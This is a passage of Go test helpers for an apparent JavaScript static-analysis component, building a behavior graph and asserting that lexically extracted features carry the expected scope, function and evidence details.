		NodeID: content.NodeID, Kind: "artifact-node", Name: content.LogicalPath,
	})
	masked := maskJavaScriptFeatureSourcePrefix(source)
	for _, scope := range buildJavaScriptStructuralIndex(strings.Split(masked, "\n")).Scopes {
		lineStart := scope.StartLine
		if lineStart < scope.EndLine {
			lineStart++
		}
		graph.AddScope(behavior.Scope{
			NodeID: content.NodeID, ParentID: content.ScopeID,
			Kind: "function", Name: scope.Name, Function: scope.Name,
			LineStart: lineStart, LineEnd: scope.EndLine,
		})
	}
	graph.AddAnalysisSelection(behavior.AnalysisSelection{
		NodeID: content.NodeID,
		Reasons: []behavior.SelectionReason{
			behavior.SelectionReasonDefaultRelevant,
		},
	})
	return graph, content
}

func javaScriptSourceFeatures(graph behavior.Graph) []behavior.Feature {
	var out []behavior.Feature
	for index := range graph.Features {
		if javaScriptFeatureIsLexical(graph, graph.Features[index]) {
			out = append(out, graph.Features[index])
		}
	}
	return out
}

func javaScriptFeatureByKeyValue(
	graph behavior.Graph,
	key, value string,
) *behavior.Feature {
	for index := range graph.Features {
		if graph.Features[index].Key == key &&
			graph.Features[index].Value == value &&
			javaScriptFeatureIsLexical(graph, graph.Features[index]) {
			return &graph.Features[index]
		}
	}
	return nil
}

func javaScriptFeatureIsLexical(
	graph behavior.Graph,
	feature behavior.Feature,
) bool {
	if feature.Key == javaScriptModuleSpecifierFeatureKey {
		return true
	}
	for _, evidenceID := range feature.EvidenceIDs {
		evidence := evidenceByIDForTest(graph, evidenceID)
		if evidence != nil && evidence.Method == "javascript-lexical" {
			return true
		}
	}
	return false
}

func countJavaScriptFeatures(graph behavior.Graph, key string) int {
	count := 0
	for _, feature := range javaScriptSourceFeatures(graph) {
		if feature.Key == key {
			count++
		}
	}
	return count
}

func evidenceByIDForTest(
	graph behavior.Graph,
	evidenceID string,
) *behavior.Evidence {
	for index := range graph.Evidence {
		if graph.Evidence[index].ID == evidenceID {
			return &graph.Evidence[index]
		}
	}
	return nil
}

func assertJavaScriptFeature(
	t *testing.T,
	graph behavior.Graph,
	want javaScriptFeatureExpectation,
) {
	t.Helper()
	feature := javaScriptFeatureByKeyValue(graph, want.key, want.value)
	if feature == nil {
		t.Fatalf("missing %s=%q: %#v", want.key, want.value, javaScriptSourceFeatures(graph))
		return
	}
	if feature.Support != behavior.SupportDirect ||
		feature.Execution.Connectivity != behavior.ConnectivityUnknown ||
		len(feature.Execution.ExecutionRootIDs) != 0 ||
		len(feature.Execution.InvokedTargetIDs) != 0 {
		t.Fatalf("%s=%q gained weak support or execution ownership: %#v", want.key, want.value, feature)
	}
	if feature.NodeID != "node-javascript-features" ||
		feature.SourceFunction != want.function ||
		feature.Qualifiers["form"] != want.form {
		t.Fatalf("%s=%q has wrong context: %#v", want.key, want.value, feature)
	}
	if want.unscoped {
		if feature.ScopeID != "" {
			t.Fatalf("%s=%q opaque observation gained scope %q", want.key, want.value, feature.ScopeID)
		}
	} else if feature.ScopeID == "" {
		t.Fatalf("%s=%q lost exact scope: %#v", want.key, want.value, feature)
	}
	if len(feature.EvidenceIDs) != 1 {
		t.Fatalf("%s=%q evidence count = %d, want 1", want.key, want.value, len(feature.EvidenceIDs))
	}
	evidence := evidenceByIDForTest(graph, feature.EvidenceIDs[0])
	if evidence == nil ||
		evidence.Method != "javascript-lexical" ||
		evidence.Line != want.line ||
		!evidence.ByteOffsetKnown() ||
		evidence.NodeID != feature.NodeID ||
		evidence.ScopeID != feature.ScopeID ||
		evidence.Function != feature.SourceFunction {
		t.Fatalf("%s=%q has invalid evidence: feature=%#v evidence=%#v", want.key, want.value, feature, evidence)
	}
}

func hasCoverageDetail(
	graph behavior.Graph,
	area, fragment string,
) bool {
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == area &&
			coverage.Status == "partial" &&
			strings.Contains(coverage.Detail, fragment) {
			return true
		}
	}
	return false
}
